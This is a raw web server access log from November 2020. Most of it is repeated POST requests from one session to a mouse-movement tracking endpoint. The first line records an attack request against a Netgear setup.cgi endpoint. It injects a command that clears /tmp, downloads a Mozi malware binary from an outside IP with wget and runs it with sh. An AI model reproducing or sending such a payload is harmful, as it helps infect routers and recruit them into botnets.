- - [26/Nov/2020:07:00:04 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.223.12.183:54430/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1835 "-" - "-"
- - [26/Nov/2020:08:43:26 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:27 +0000] "-" 408 0 "-" - "-"
- - [26/Nov/2020:08:43:27 +0000] "-" 408 0 "-" - "-"
- - [26/Nov/2020:08:43:27 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:28 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:29 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:30 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:31 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:32 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:33 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:34 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:35 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:36 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:37 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:38 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:39 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:40 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:41 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:42 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:43 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:44 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:45 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:46 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:47 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:48 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:49 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:50 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:51 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:52 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:53 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:54 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:55 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:56 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:57 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:58 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:43:59 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:00 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:01 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:02 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:03 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:04 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:05 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:06 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:07 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:08 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:09 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:10 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:11 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 384 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:12 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 421 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:13 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:14 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:15 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:16 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:17 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:18 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:19 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:20 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:21 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:22 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:23 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:24 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:25 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:26 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:27 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:28 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:29 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:30 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:31 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:32 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:33 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:34 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:35 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:36 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:37 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:08:44:38 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis/data_mining.php" 0ikgnsdpp5jt1qd7fro2va4oka "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
